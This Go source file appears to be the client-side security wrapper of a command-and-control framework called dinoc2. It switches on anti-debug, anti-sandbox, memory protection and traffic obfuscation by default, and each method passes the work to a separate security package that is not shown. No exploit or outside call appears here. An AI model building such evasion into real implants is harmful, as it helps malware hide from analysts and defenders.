package client

import (
	"crypto/tls"
	"crypto/x509"
	"dinoc2/pkg/security"
	"fmt"
	"time"
)

// SecurityOptions configures client security behavior
type SecurityOptions struct {
	EnableAntiDebug      bool
	EnableAntiSandbox    bool
	EnableMemoryProtection bool
	EnableAuthentication bool
	EnableSignatureVerification bool
	EnableIntegrityChecking bool
	EnableTrafficObfuscation bool
	SecurityViolationCallback func(violation string)
}

// DefaultSecurityOptions returns default security options
func DefaultSecurityOptions() SecurityOptions {
	return SecurityOptions{
		EnableAntiDebug:      true,
		EnableAntiSandbox:    true,
		EnableMemoryProtection: true,
		EnableAuthentication: true,
		EnableSignatureVerification: true,
		EnableIntegrityChecking: true,
		EnableTrafficObfuscation: true,
		SecurityViolationCallback: nil,
	}
}

// SecurityIntegration integrates security features with the client
type SecurityIntegration struct {
	options         SecurityOptions
	securityManager *security.SecurityManager
	client          *Client
}

// NewSecurityIntegration creates a new security integration
func NewSecurityIntegration(client *Client, options SecurityOptions) (*SecurityIntegration, error) {
	// Create security manager options
	managerOptions := security.SecurityManagerOptions{
		EnableAntiDebug:      options.EnableAntiDebug,
		EnableAntiSandbox:    options.EnableAntiSandbox,
		EnableMemoryProtection: options.EnableMemoryProtection,
		EnableAuthentication: options.EnableAuthentication,
		EnableSignatureVerification: options.EnableSignatureVerification,
		EnableIntegrityChecking: options.EnableIntegrityChecking,
		EnableTrafficObfuscation: options.EnableTrafficObfuscation,
		SecurityViolationCallback: options.SecurityViolationCallback,
	}

	// Create security manager
	manager := security.NewSecurityManager(managerOptions)
	err := manager.Initialize()
	if err != nil {
		return nil, fmt.Errorf("failed to initialize security manager: %w", err)
	}

	return &SecurityIntegration{
		options:         options,
		securityManager: manager,
		client:          client,
	}, nil
}

// Initialize initializes the security integration
func (s *SecurityIntegration) Initialize() error {
	// Run security checks
	if !s.securityManager.RunSecurityChecks() {
		violations := s.securityManager.GetViolations()
		return fmt.Errorf("security checks failed: %v", violations)
	}

	// Start security monitoring
	s.securityManager.StartSecurityMonitoring(30 * time.Second)

	return nil
}

// ProtectData protects sensitive data in memory
func (s *SecurityIntegration) ProtectData(id string, data []byte) error {
	return s.securityManager.ProtectData(id, data)
}

// AccessProtectedData accesses protected data in memory
func (s *SecurityIntegration) AccessProtectedData(id string) ([]byte, error) {
	return s.securityManager.AccessProtectedData(id)
}

// ObfuscateTraffic obfuscates outgoing traffic
func (s *SecurityIntegration) ObfuscateTraffic(data []byte) ([]byte, error) {
	return s.securityManager.ObfuscateTraffic(data)
}

// DeobfuscateTraffic deobfuscates incoming traffic
func (s *SecurityIntegration) DeobfuscateTraffic(data []byte) ([]byte, error) {
	return s.securityManager.DeobfuscateTraffic(data)
}

// VerifyModuleSignature verifies a module signature
func (s *SecurityIntegration) VerifyModuleSignature(moduleData, signature []byte, cert *x509.Certificate) (bool, error) {
	return s.securityManager.VerifyModuleSignature(moduleData, signature, cert)
}

// GetTLSConfig returns a TLS configuration for the client
func (s *SecurityIntegration) GetTLSConfig() (*tls.Config, error) {
	return s.securityManager.GetTLSConfig(false)
}

// Shutdown shuts down the security integration
func (s *SecurityIntegration) Shutdown() {
	s.securityManager.Shutdown()
}
